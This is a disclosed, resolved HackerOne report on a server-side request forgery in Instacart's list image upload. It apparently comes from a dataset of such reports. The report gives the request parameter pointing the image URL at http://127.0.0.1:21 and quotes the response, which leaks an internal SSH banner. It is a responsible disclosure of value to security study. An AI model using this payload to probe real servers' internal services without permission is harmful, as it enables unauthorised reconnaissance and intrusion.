---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '158016'
original_report_id: '158016'
title: Server side request forgery on image upload for lists
weakness: Code Injection
team_handle: instacart
created_at: '2016-08-09T23:44:41.943Z'
disclosed_at: '2016-10-12T21:11:01.088Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 19
tags:
- hackerone
- code-injection
---

# Server side request forgery on image upload for lists

## Metadata

- HackerOne Report ID: 158016
- Weakness: Code Injection
- Program: instacart
- Disclosed At: 2016-10-12T21:11:01.088Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Summary
----------

There is a Server-side request forgery when updating the image for a list.

Steps to reproduce
-----------------

1. Create a list and change its image. That will send a POST request to https://beta.instacart.com/api/v2/lists/[LIST_ID] with the following parameters:

    ```
list[remote_image_url]=https://example.com/yourimage.jpg
```

2. Change the  url to http://127.0.0.1:21 and you will get as response:

    ```{json}
{
	"meta":
	{
		"code": 400,
		"error_type": "List Error",
		"error_message": "There was an error while updating this list",
		"errors": ["Image could not download file: wrong status line: \"SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3\""]
	}
}
```
    Which shows that it tried to connect to the SSH port on localhost.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
